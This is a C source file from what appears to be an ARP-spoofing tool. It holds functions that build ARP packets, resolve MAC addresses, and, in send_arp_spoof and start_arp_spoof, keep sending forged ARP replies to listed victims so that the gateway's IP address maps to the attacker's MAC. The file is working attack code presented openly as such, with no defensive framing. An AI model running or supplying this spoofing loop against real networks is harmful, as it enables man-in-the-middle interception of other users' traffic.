#include "core.h"

ether_arp build_ether_arp(
    int op,
    Mac target_mac,
    u32 target_addr_hl,
    Mac source_mac,
    u32 source_addr_hl
) {
    ether_arp arp = {0};
    arp.arp_hrd = htons(ARPHRD_ETHER);
    arp.arp_pro = htons(ETH_P_IP);
    arp.arp_hln = ETHER_ADDR_LEN;
    arp.arp_pln = sizeof(in_addr_t);
    arp.arp_op = htons(op);

    memcpy(&arp.arp_sha, source_mac.bytes, sizeof(arp.arp_sha));
    memcpy(&arp.arp_spa, &source_addr_hl, sizeof(arp.arp_spa));
    memcpy(&arp.arp_tha, target_mac.bytes, sizeof(arp.arp_tha));
    memcpy(&arp.arp_tpa, &target_addr_hl, sizeof(arp.arp_tpa));

    return arp;
}

void broadcast_arp_request(
    int arp_sock,
    char* if_name,
    u32 target_addr_hl,
    u32 source_addr_hl,
    Mac source_mac
) {
    ether_arp req = build_ether_arp(
        ARPOP_REQUEST,
        BROADCAST_MAC,
        target_addr_hl,
        source_mac,
        source_addr_hl
    );
    sockaddr_ll addr_ll = get_arp_sockaddr_ll(if_name, BROADCAST_MAC);

    if (sendto(
            arp_sock,
            &req,
            sizeof(ether_arp),
            0,
            (sockaddr*)&addr_ll,
            sizeof(addr_ll)
        )
        == -1) {
        perror("sendto");
        fprintf(stderr, "ERROR: Failed to broadcast_arp_request\n");
        close(arp_sock);
        exit(1);
    }
}

int receive_arp_reply(
    int arp_sock,
    u32 target_addr_hl,
    ether_arp* rep,
    int timeout_sec,
    int n_tries
) {
    if (n_tries <= 0) {
        return 0;
    }

    fd_set socks;
    FD_ZERO(&socks);
    FD_SET(arp_sock, &socks);
    timeval timeout;
    timeout.tv_sec = timeout_sec;
    timeout.tv_usec = 0;

    int ret = select(arp_sock + 1, &socks, NULL, NULL, &timeout);
    if (ret == -1) {
        perror("select");
        goto fail;
    } else if (ret == 0) {
        return receive_arp_reply(
            arp_sock, target_addr_hl, rep, timeout_sec, n_tries - 1
        );
    }

    int res = recv(arp_sock, rep, sizeof(ether_arp), 0);
    if (res == -1) {
        perror("recv");
        goto fail;
    }

    if (*(u32*)rep->arp_spa != target_addr_hl) {
        return receive_arp_reply(
            arp_sock, target_addr_hl, rep, timeout_sec, n_tries
        );
    }

    return 1;

fail:
    fprintf(stderr, "ERROR: Failed to receive_arp_reply\n");
    close(arp_sock);
    exit(1);
}

int request_target_mac(
    int arp_sock,
    char* if_name,
    Mac* target_mac,
    u32 target_addr_hl,
    int timeout_sec,
    int n_tries
) {
    u32 source_addr_hl = get_interface_addr_hl(if_name);
    Mac source_mac = get_interface_mac(if_name);

    broadcast_arp_request(
        arp_sock, if_name, target_addr_hl, source_addr_hl, source_mac
    );

    ether_arp rep;
    if (receive_arp_reply(
            arp_sock, target_addr_hl, &rep, timeout_sec, n_tries
        )) {
        memcpy(target_mac->bytes, rep.arp_sha, sizeof(rep.arp_sha));
        return 1;
    }

    return 0;
}

void send_arp_spoof(
    int arp_sock,
    char* if_name,
    Mac attacker_mac,
    u32 gateway_ip,
    Mac victim_mac,
    u32 victim_ip
) {
    sockaddr_ll addr_ll = get_arp_sockaddr_ll(if_name, victim_mac);
    ether_arp spoof = build_ether_arp(
        ARPOP_REPLY, victim_mac, victim_ip, attacker_mac, gateway_ip
    );

    if (sendto(
            arp_sock,
            &spoof,
            sizeof(spoof),
            0,
            (sockaddr*)&addr_ll,
            sizeof(addr_ll)
        )
        == -1) {
        perror("sendto");
        fprintf(stderr, "ERROR: Failed to send_arp_spoof\n");
        close(arp_sock);
        exit(1);
    }
}

void* start_arp_spoof(void* args) {
    ARPSpoofArgs* arp_spoof_args = (ARPSpoofArgs*)args;
    time_t start_time = 0;
    int elapsed_time;
    do {
        time_t current_time = time(NULL);
        elapsed_time = current_time - start_time;
        if (elapsed_time >= arp_spoof_args->period_sec) {
            for (int i = 0; i < arp_spoof_args->n_victims; ++i) {
                Mac victim_mac = arp_spoof_args->victim_macs[i];
                u32 victim_addr_hl = arp_spoof_args->victim_addrs_hl[i];
                send_arp_spoof(
                    arp_spoof_args->arp_sock,
                    arp_spoof_args->if_name,
                    arp_spoof_args->attacker_mac,
                    arp_spoof_args->gateway_addr_hl,
                    victim_mac,
                    victim_addr_hl
                );
            }
            start_time = time(NULL);
        }
    } while (arp_spoof_args->is_terminated == 0);

    return NULL;
}

void print_ether_arp(ether_arp arp) {
    in_addr source_in_addr;
    in_addr target_in_addr;
    char source_mac_str[18] = {0};
    char target_mac_str[18] = {0};

    memcpy(&source_in_addr, &arp.arp_spa, sizeof(in_addr));
    memcpy(&target_in_addr, &arp.arp_tpa, sizeof(in_addr));

    Mac source_mac = {0};
    Mac target_mac = {0};
    memcpy(&source_mac.bytes, arp.arp_sha, sizeof(arp.arp_sha));
    memcpy(&target_mac.bytes, arp.arp_tha, sizeof(arp.arp_tha));

    printf("  MAC: ");
    print_mac(source_mac);
    printf(" -> ");
    print_mac(target_mac);
    printf("\n  IP:  ");
    printf("%s -> ", inet_ntoa(source_in_addr));
    printf("%s\n", inet_ntoa(target_in_addr));
}
